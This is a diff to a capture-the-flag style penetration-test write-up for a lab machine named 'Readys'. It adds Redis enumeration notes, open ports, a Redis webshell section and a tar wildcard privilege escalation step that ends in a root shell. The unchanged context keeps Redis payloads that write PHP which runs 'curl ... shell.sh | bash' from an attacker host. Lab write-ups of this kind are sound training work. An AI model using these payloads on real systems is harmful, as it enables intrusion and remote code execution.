@@ -3,7 +3,7 @@ Alias: Readys
 Date: 5/20/2022
 Platform: Linux
 Difficulty: Intermediate
-Tags:
+Tags: #vunerablepluginSite-EditorVersion1 #LocalFileInclusion 
 Status: Finished
 IP: 192.168.53.166 
 ---
@@ -16,12 +16,12 @@ IP: 192.168.53.166
 - Text
 
 ## Improved skills
-- skill 1
-- skill 2
+- redis enumerating
 
 ## Used tools
 - nmap
 - rustscan
+- redis
 
 ---
 
@@ -98,7 +98,8 @@ Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
 
 Enumerated open TCP ports:
 ```bash
-
+80
+6379
 ```
 
 Enumerated top 200 UDP ports:
@@ -183,6 +184,7 @@ set test "<?php system('id'); ?>"
 ---
 
 # Exploitation
+## Redis Webshell
 
 #### -Typed "vim shell.sh" on kali machine and typed the following into the "shell.sh":
 
@@ -220,11 +222,15 @@ set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 
 ![](Pasted%20image%2020221101120854.png)
 ![](Pasted%20image%2020221101120920.png)
-
+#TarWildcardPrivilegeEscalation
 
 
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+## Tar Wildcard Privilege Escalation
+
+#### -Followed all the steps in the "/var/www/html" directory. Waited a few minutes for the cronjob/script to run. Typed "sudo su" and received a root shell:
+
+![](Pasted%20image%2020221101121057.png)
 
 ---
 
